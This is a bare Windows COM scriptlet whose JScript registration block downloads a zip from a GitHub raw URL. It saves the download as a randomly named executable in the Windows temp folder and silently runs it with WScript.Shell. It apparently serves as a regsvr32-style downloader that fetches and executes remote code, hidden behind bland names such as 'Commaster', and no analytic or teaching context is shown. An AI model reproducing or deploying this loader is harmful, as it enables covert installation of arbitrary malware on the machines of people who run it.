<?XML version="1.0"?>
<scriptlet>

<registration
    description="Com"
    progid="Commaster"
    version="1.00"
    classid="{20001111-0000-0000-0000-0000FEEDACDC}"
    >
    <script language="JScript">
        <![CDATA[
var Source = "https://raw.githubusercontent.com/justtest1314/justme2/master/test.zip";
var Target = "c:\\windows\\temp\\"+String(Math.random()*(Math.pow(10,10)))+".exe";
var Object = new ActiveXObject('MSXML2.XMLHTTP');
Object.Open('GET', Source, false);
Object.Send();
if (Object.Status == 200)
{
    // Create the Data Stream
    var Stream = new ActiveXObject('ADODB.Stream');

    // Establish the Stream
    Stream.Open();
    Stream.Type = 1; // adTypeBinary
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;
    Stream.SaveToFile(Target, 2); // adSaveCreateOverWrite
    Stream.Close();
    new ActiveXObject("WScript.Shell").Run(Target,0,true);
}
        ]]>
</script>
</registration>

<public>
    <method name="Exec"></method>
</public>

</scriptlet>
